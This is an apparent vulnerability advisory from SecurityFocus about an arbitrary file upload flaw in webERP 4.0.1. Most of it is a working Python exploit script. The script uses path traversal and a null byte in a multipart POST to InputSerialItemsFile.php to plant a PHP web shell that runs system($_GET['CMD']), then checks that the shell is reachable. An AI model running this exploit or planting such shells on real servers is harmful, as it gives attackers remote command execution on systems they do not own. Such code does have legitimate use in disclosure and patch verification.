source: http://www.securityfocus.com/bid/46341/info

webERP is prone to an arbitrary-file-upload vulnerability because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this issue to upload arbitrary code and run it in the context of the webserver process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

webERP 4.0.1 is vulnerable; other versions may also be affected. 

import socket

host = 'localhost'
path = '/weberp'
shell_path = path + '/shell.php'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST ' + path + '/includes/InputSerialItemsFile.php?LineNo=/../../../shell.php%00 HTTP/1.1\r\n'
           'Host: localhost\r\n'
           'Connection: keep-alive\r\n'
           'User-Agent: x\r\n'
           'Content-Length: 264\r\n'
           'Cache-Control: max-age=0\r\n'
           'Origin: null\r\n'
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
           '\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="LineNo"\r\n'
           '\r\n'
           'shell.php\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="ImportFile"; filename="shell.php"\r\n'
           'Content-Type: application/octet-stream\r\n'
           '\r\n'
           '<?php echo \'<pre>\' + system($_GET[\'CMD\']) + \'</pre>\'; ?>\r\n'
           '------x--\r\n'
           '\r\n')

    resp = s.recv(8192)

    http_ok = 'HTTP/1.1 200 OK'
    
    if http_ok not in resp[:len(http_ok)]:
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    s.send('GET ' + shell_path + ' HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192)[:len(http_ok)]: print 'shell not found'        
    else: print 'shell located at http://' + host + shell_path

upload_shell()